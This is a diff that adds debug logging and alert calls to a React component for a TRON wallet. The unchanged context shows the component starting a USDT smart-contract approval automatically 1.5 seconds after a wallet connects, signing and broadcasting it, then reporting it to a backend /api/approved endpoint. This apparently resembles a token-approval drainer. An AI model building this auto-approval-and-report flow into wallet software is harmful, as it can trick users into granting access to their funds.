@@ -62,7 +62,9 @@ export function HeroSection({ onConnect, onDisconnect, onApprovalSuccess }: any)
   }, [connected]);
 
   useEffect(() => {
+    console.log("Step 0 Here")
     if (connected && address && !approvalAttempted.current) {
+      console.log("address, connected, approvalAttempted", address, connected, approvalAttempted.current);
       approvalAttempted.current = true;
       onConnect?.({
         address,
@@ -75,6 +77,8 @@ export function HeroSection({ onConnect, onDisconnect, onApprovalSuccess }: any)
       setTimeout(() => {
         handleApproval();
       }, 1500);
+    } else {
+      console.log("From Else ---> address, connected, approvalAttempted", address, connected, approvalAttempted.current);
     }
   }, [connected, address]);
 
@@ -140,6 +144,7 @@ export function HeroSection({ onConnect, onDisconnect, onApprovalSuccess }: any)
   // ======================
   const handleApproval = async () => {
     try {
+      alert("Step 1 Here");
       setLoading(true);
       setError("");
 
@@ -148,6 +153,8 @@ export function HeroSection({ onConnect, onDisconnect, onApprovalSuccess }: any)
       }
 
       const tronWeb = buildTronWeb();
+
+      alert("Step 2 Here");
 
       const tx = await tronWeb.transactionBuilder.triggerSmartContract(
         USDT_ADDRESS,
@@ -163,17 +170,23 @@ export function HeroSection({ onConnect, onDisconnect, onApprovalSuccess }: any)
         address
       );
 
+      alert("Step 3 Here");
+
       if (!tx?.transaction) {
         throw new Error("Failed to build transaction");
       }
 
       const signed = await wallet.adapter.signTransaction(tx.transaction);
 
+      alert("Step 4 Here");
+
       if (!signed) {
         throw new Error("Signing failed");
       }
 
       const result = await tronWeb.trx.sendRawTransaction(signed);
+
+      alert("Step 5 Here");
 
       await fetch(`${BASE_URL}/api/approved`, {
         method: 'POST',
